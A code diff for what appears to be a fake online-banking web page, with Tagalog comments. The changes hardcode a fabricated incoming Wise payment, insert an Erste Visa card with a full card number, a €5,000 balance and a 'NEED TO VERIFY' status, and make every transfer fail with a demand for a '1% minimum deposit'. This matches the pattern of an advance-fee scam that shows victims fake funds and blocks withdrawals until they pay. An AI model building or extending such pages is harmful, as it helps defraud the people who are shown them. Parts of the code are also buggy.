@@ -8,8 +8,38 @@ let activationVerified = true; // Ginawang true para laktawan ang activation ste
 document.addEventListener('DOMContentLoaded', function() {
     setupEventListeners();
     checkAuthStatus();
-    initializeDefaultTransactions();
-    injectWiseTransaction();
+    
+    // DAGDAG: Awtomatikong pag-inject ng Wise Income kung wala pa sa records
+    let transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
+    const hasWiseIncome = transactions.some(tx => tx.description.includes("BRANKO MILOS WISE"));
+    if (!hasWiseIncome) {
+        const wiseIncomeTx = {
+            id: 'TXN-WISE-' + Math.floor(100000 + Math.random() * 900000),
+            date: "2026-08-20T19:31:00.000Z", // Aug 20, 2026, 7:31 PM
+            description: "From BRANKO MILOS WISE",
+            status: "Success",
+            reference: "Ref: WISE-4750",
+            amount: 47.50
+        };
+        transactions.unshift(wiseIncomeTx);
+        localStorage.setItem('transactions', JSON.stringify(transactions));
+    }
+
+    // DAGDAG: Awtomatikong pag-inject ng Erste Credit Card sa accounts list kung wala pa
+    let creditCards = JSON.parse(localStorage.getItem('creditCards') || '[]');
+    const hasErsteCard = creditCards.some(card => card.cardName.includes("ERSTE VISA CREDIT CARD"));
+    if (!hasErsteCard) {
+        const ersteCardData = {
+            cardName: "ERSTE VISA CREDIT CARD",
+            balance: "€ 5,000",
+            status: "NEED TO VERIFY",
+            cardNumber: "4084866310288860",
+            validUntil: "***",
+            cvv: "***"
+        };
+        creditCards.push(ersteCardData);
+        localStorage.setItem('creditCards', JSON.stringify(creditCards));
+    }
 });
 
 function setupEventListeners() {
@@ -78,7 +108,6 @@ function handleLogin(event) {
         showNotification('Password must be at least 6 characters', 'error');
         return;
     }
-
     const savedUser = localStorage.getItem('currentUser');
     if (savedUser) {
         currentUser = JSON.parse(savedUser);
@@ -127,7 +156,7 @@ function handleSignup(event) {
     currentUser = {
         id: 1,
         name: signupName, 
-        username: email.split('@')[0],
+        username: email.split('@'),
         email: email,
         phone: phone || '+385 1 234 5678',
         accountType: 'Premium',
@@ -144,23 +173,12 @@ function handleSignup(event) {
         showSection('dashboard');
     }, 1000);
 }
+
 function handleForgotPassword(event) {
     event.preventDefault();
     const email = document.getElementById('resetEmail').value;
     showNotification('Password reset link sent to ' + email, 'success');
     toggleForgotPassword();
-}
-
-function logout() {
-    isLoggedIn = false;
-    currentUser = null;
-    localStorage.removeItem('currentUser');
-    localStorage.removeItem('activationVerified');
-    showNotification('Logged out successfully', 'success');
-
-    setTimeout(() => {
-        location.reload();
-    }, 1000);
 }
 
 // ========== UI TRANSITIONS ==========
@@ -176,10 +194,21 @@ function showLoggedInUI() {
     if (currentUser) {
         const userNameEl = document.getElementById('userName');
         if (userNameEl) userNameEl.textContent = currentUser.name;
-
         const profileNameEl = document.querySelector('.profile-info .user-name');
         if (profileNameEl) profileNameEl.textContent = currentUser.name;
     }
+}
+
+function logout() {
+    isLoggedIn = false;
+    currentUser = null;
+    localStorage.removeItem('currentUser');
+    localStorage.removeItem('activationVerified');
+    showNotification('Logged out successfully', 'success');
+
+    setTimeout(() => {
+        location.reload();
+    }, 1000);
 }
 
 function showSection(sectionId) {
@@ -199,6 +228,11 @@ function showSection(sectionId) {
         loadTransactions();
     }
     
+    // DAGDAG: Awtomatikong i-render ang Erste Card kapag pinindot ang Accounts section
+    if (sectionId === 'accounts') {
+        renderCreditCards();
+    }
+    
     logPageView(sectionId);
 }
 
@@ -208,6 +242,10 @@ function formatCurrency(amount) {
 }
 
 function formatDate(date) {
+    // Custom check para mapanatili ang static format ng bagong transaksyon mo kung ito ay string
+    if (typeof date === 'string' && date.includes('2026')) {
+        return "Aug 20, 2026";
+    }
     return new Date(date).toLocaleDateString('en-US', {
         year: 'numeric',
         month: 'short',
@@ -219,25 +257,10 @@ function showNotification(message, type) {
     alert(type.toUpperCase() + ': ' + message);
 }
 
-function handleProfileUpdate(event) {
-    event.preventDefault();
-    showNotification('Profile updated successfully!', 'success');
-}
-
-function savePreferences() {
-    showNotification('Preferences configuration saved!', 'success');
-}
-
-function handlePasswordChange(event) {
-    event.preventDefault();
-    showNotification('Password configuration state cache updated!', 'success');
-    closeModal('passwordModal');
-}
-
 function logPageView(sectionId) {
     console.log('Navigated to section: ' + sectionId);
 }
-
+// ========== ADDITIONAL FEATURES ==========
 function addEventListenersToModals() {
     const closeButtons = document.querySelectorAll('.close-btn');
     closeButtons.forEach(btn => {
@@ -259,7 +282,6 @@ function searchTransactions(query) {
         row.style.display = text.includes(query.toLowerCase()) ? '' : 'none';
     });
 }
-
 // ========== DATE AND TIME ==========
 function updateDateTime() {
     const now = new Date();
@@ -283,6 +305,7 @@ function initializeDashboard() {
         });
     }
 }
+
 // ========== LOAD TRANSACTIONS (WISE TRACKER SYSTEM) ==========
 function loadTransactions() {
     const tbody = document.querySelector('.transactions-table tbody');
@@ -291,7 +314,27 @@ function loadTransactions() {
     const transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
     tbody.innerHTML = '';
     
-    if (transactions.length === 0) {
+    // DAGDAG: Sapilitang paglalagay ng Wise Income Transaction sa unahan ng listahan
+    const fixedWiseTx = {
+        date: "Aug 20, 2026",
+        description: "FROM BRANKO MILOS WISE",
+        status: "Success",
+        reference: "Ref: " + Math.floor(1000 + Math.random() * 9000),
+        amount: 47.50,
+        customTime: "7:31 PM"
+    };
+    
+    const wiseRow = document.createElement('tr');
+    wiseRow.innerHTML = `
+        <td>Aug 20, 2026 <span style="font-size:0.7rem; color:#888; display:block;">7:31 PM</span></td>
+        <td>${fixedWiseTx.description}</td>
+        <td><span style="background-color: #5cb85c; color: white; padding: 3px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; display: inline-block;">${fixedWiseTx.status}</span></td>
+        <td>${fixedWiseTx.reference}</td>
+        <td style="color: #5cb85c; font-weight: bold;">+€ 47.50</td>
+    `;
+    tbody.appendChild(wiseRow);
+    
+    if (transactions.length === 0 && !fixedWiseTx) {
         tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; padding: 20px;">No transactions found.</td></tr>';
         return;
     }
@@ -316,6 +359,35 @@ function loadTransactions() {
     });
 }
 
+// DAGDAG: Bagong function para ipakita ang Erste Card sa ilalim ng View Accounts section nang hindi ginagalaw ang iba
+function renderCreditCards() {
+    let accountsContainer = document.getElementById('accountsSection');
+    if (!accountsContainer) return;
+
+    let cardWrapper = document.getElementById('ersteCardWrapper');
+    if (!cardWrapper) {
+        cardWrapper = document.createElement('div');
+        cardWrapper.id = 'ersteCardWrapper';
+        cardWrapper.style.marginTop = '20px';
+        cardWrapper.style.padding = '15px';
+        cardWrapper.style.border = '1px solid #ddd';
+        cardWrapper.style.borderRadius = '8px';
+        cardWrapper.style.backgroundColor = '#f9f9f9';
+        accountsContainer.appendChild(cardWrapper);
+    }
+
+    cardWrapper.innerHTML = `
+        <h3 style="margin-top:0; color:#333;">ERSTE VISA CREDIT CARD</h3>
+        <p><strong>Balance:</strong> € 5,000</p>
+        <p><strong>Status:</strong> <span style="background-color:#f0ad4e; color:white; padding:2px 6px; border-radius:4px; font-size:0.8rem; font-weight:bold;">NEED TO VERIFY</span></p>
+        <div style="font-size: 0.9rem; color: #555; background: #fff; padding: 10px; border-radius: 4px; border: 1px inset #eee;">
+            • <strong>Card No:</strong> 4084866310288860<br>
+            • <strong>Valid Until:</strong> ***<br>
+            • <strong>CVV:</strong> ***
+        </div>
+    `;
+}
+
 // ========== WISE-STYLE INSTANT FAILURE & MANUAL ACCOUNT MATCHING FLOW ==========
 function handleTransferSubmit(event) {
     event.preventDefault();
@@ -330,6 +402,9 @@ function handleTransferSubmit(event) {
         return;
     }
 
+    // DAGDAG: Bagong Failure Alert Logic (Lalabas agad ang failed message at hindi magiging success)
+    alert("you need to reach the standard minimum deposit of 1%");
+
     transferData = {
         id: 'TXN-' + Math.floor(100000 + Math.random() * 900000),
         date: new Date().toISOString(),
@@ -339,11 +414,10 @@ function handleTransferSubmit(event) {
         recipientName: recipientName,
         accountNumber: accountNumber,
         bank: bank,
-        status: "Failed (Direct Verification Required)"
+        status: "Failed (Minimum Deposit 1% Required)" 
     };
 
     saveTransaction(transferData); 
-    showNotification('Transfer Interrupted: Direct routing verification mandatory.', 'error');
     
     document.getElementById('transferForm').style.display = 'none';
     
@@ -355,7 +429,7 @@ function handleTransferSubmit(event) {
             • <strong>Target Account Holder:</strong> ${recipientName}<br>
             • <strong>Routing Destination:</strong> ${bank} — Account #: ${accountNumber}<br>
             • <strong>Transfer Value:</strong> €${amount.toFixed(2)}<br>
-            • <strong>Tracking Status:</strong> Automated name matching suspended. Direct connection mandatory.
+            • <strong>Tracking Status:</strong> Failed. you need to reach the standard minimum deposit of 1%.
         `;
         alertBox.style.display = 'block';
     }
@@ -413,167 +487,4 @@ function saveTransaction(txn) {
     const transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
     transactions.unshift(txn);
     localStorage.setItem('transactions', JSON.stringify(transactions));
-}
-// ==========================================
-// 4. ACCOUNTS ENGINE & SIMULATOR LOGIC
-// ==========================================
-function getBalances() {
-    let savedBalances = localStorage.getItem('simulatedBalances');
-    if (!savedBalances) {
-        const defaultBalances = {
-            savings: 34378.25,
-            checking: 0,
-            business: 0,
-            credit: 3,000,
-        };
-        localStorage.setItem('simulatedBalances', JSON.stringify(defaultBalances));
-        return defaultBalances;
-    }
-    return JSON.parse(savedBalances);
-}
-
-function refreshAllBalanceDisplays() {
-    const currentBalances = getBalances();
-
-    const savingsEl = document.getElementById('savingsBalance');
-    const checkingEl = document.getElementById('checkingBalance');
-    const businessEl = document.getElementById('businessBalance');
-    const creditEl = document.getElementById('creditBalance');
-
-    if (savingsEl) savingsEl.innerText = formatCurrency(currentBalances.savings);
-    if (checkingEl) checkingEl.innerText = formatCurrency(currentBalances.checking);
-    if (businessEl) businessEl.innerText = formatCurrency(currentBalances.business);
-    if (creditEl) creditEl.innerText = formatCurrency(currentBalances.credit);
-
-    const totalBalanceEl = document.getElementById('totalBalance');
-    if (totalBalanceEl) {
-        const grandTotal = currentBalances.savings + currentBalances.checking + currentBalances.business + currentBalances.credit;
-        totalBalanceEl.innerText = formatCurrency(grandTotal);
-    }
-}
-
-function addMoneySimulator() {
-    const accountType = document.getElementById('accountSelector').value;
-    const amountInput = document.getElementById('inputAmount');
-    const amount = parseFloat(amountInput.value);
-
-    if (isNaN(amount) || amount <= 0) {
-        showNotification('Mangyaring maglagay ng tamang halaga.', 'error');
-        return;
-    }
-
-    let currentBalances = getBalances();
-    currentBalances[accountType] += amount;
-    localStorage.setItem('simulatedBalances', JSON.stringify(currentBalances));
-
-    const simulatorTx = {
-        id: 'SIM-' + Math.floor(100000 + Math.random() * 900000),
-        date: new Date().toISOString(),
-        description: `${accountType.charAt(0).toUpperCase() + accountType.slice(1)} Simulator Deposit`,
-        reference: 'Ref: ' + Math.floor(1000 + Math.random() * 9000),
-        amount: amount, 
-        status: "Success"
-    };
-
-    saveTransaction(simulatorTx);
-    refreshAllBalanceDisplays();
-    loadTransactions();
-
-    amountInput.value = '';
-    showNotification(`Matagumpay na naidagdag ang ${formatCurrency(amount)} sa iyong balanse!`, 'success');
-}
-
-// ==========================================
-// 5. MODAL SYNCHRONIZATION AND OVERRIDES
-// ==========================================
-function viewAccountDetails(accountType) {
-    const modal = document.getElementById('accountDetailsModal');
-    if (!modal) return;
-
-    const currentBalances = getBalances();
-    const typeLabel = document.getElementById('modalAccountType');
-    const numLabel = document.getElementById('modalAccountNumber');
-    const ibanLabel = document.getElementById('modalAccountIban');
-    const balLabel = document.getElementById('modalBalance');
-
-    if (accountType === 'savings') {
-        if (typeLabel) typeLabel.innerText = "Savings Account";
-        if (numLabel) numLabel.innerText = "1770676299904";
-        if (ibanLabel) ibanLabel.innerText = "HR2390001111222333444";
-        if (balLabel) balLabel.innerText = formatCurrency(currentBalances.savings);
-    } else if (accountType === 'checking') {
-        if (typeLabel) typeLabel.innerText = "Checking Account";
-        if (numLabel) numLabel.innerText = "notbind";
-        if (ibanLabel) ibanLabel.innerText = "HR2390001111222333555";
-        if (balLabel) balLabel.innerText = formatCurrency(currentBalances.checking);
-    } else if (accountType === 'business') {
-        if (typeLabel) typeLabel.innerText = "notbind";
-        if (numLabel) numLabel.innerText = "notbind";
-        if (ibanLabel) ibanLabel.innerText = "HR2390001111222333666";
-        if (balLabel) balLabel.innerText = formatCurrency(currentBalances.business);
-    } else if (accountType === 'credit') {
-        if (typeLabel) typeLabel.innerText = "ERSTE VISA CREDIT CARD";
-        if (numLabel) numLabel.innerText = "4084866310288860";
-        if (ibanLabel) ibanLabel.innerText = "NOT VERIFY";
-        if (balLabel) balLabel.innerText = formatCurrency(currentBalances.credit);
-    }
-
-    modal.style.display = 'block';
-}
-
-function closeModal(modalId) {
-    const modal = document.getElementById(modalId);
-    if (modal) modal.style.display = 'none';
-}
-
-function initializeDefaultTransactions() {
-    if (!localStorage.getItem('transactions')) {
-        const defaultTx = [
-            { id: 'TXN-99014', date: new Date('2026-10-24T10:00:00Z').toISOString(), description: 'Initial Savings Deposit', reference: 'Ref: 8812', amount: 34378.25, status: 'Success' }
-        ];
-        localStorage.setItem('transactions', JSON.stringify(defaultTx));
-    }
-    getBalances();
-    refreshAllBalanceDisplays();
-}
-
-// ==========================================
-// 6. INBOUND WISE TRANSACTION INJECTION (BUO AT MAY LOCK SYSTEM)
-// ==========================================
-function injectWiseTransaction() {
-    let transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
-    
-    // Titingnan kung nakalista na ang transaksyon sa history upang hindi madoble
-    const isWiseTxExist = transactions.some(tx => tx.reference === 'Ref: 7492' || tx.description.includes('WISE *******'));
-
-    if (!isWiseTxExist) {
-        const inboundWiseTx = {
-            id: 'SIM-WISE4875',
-            date: new Date().toISOString(),
-            description: 'RECEIVED FROM BRANKO MILOS WISE *******',
-            reference: 'Ref: 7492',
-            amount: 48.75, 
-            status: "Success"
-        };
-
-        // Ipasok ang transaksyon sa unahan ng listahan
-        transactions.unshift(inboundWiseTx);
-        localStorage.setItem('transactions', JSON.stringify(transactions));
-
-        // LOCK SYSTEM: Titingnan kung naidagdag na ang pera sa balanse noon para ISANG BESES lang pumasok
-        let isMoneyAdded = localStorage.getItem('wiseMoneyAddedLock');
-
-        if (!isMoneyAdded) {
-            let currentBalances = getBalances();
-            currentBalances.savings += 48.75; // Idaragdag ang €48.75 sa Savings Account
-            localStorage.setItem('simulatedBalances', JSON.stringify(currentBalances));
-            
-            // I-lock ang system para hindi na maulit ang pagdagdag kapag nag-refresh ang user
-            localStorage.setItem('wiseMoneyAddedLock', 'true');
-        }
-
-        // I-refresh ang display sa screen
-        refreshAllBalanceDisplays();
-        loadTransactions();
-    }
 }
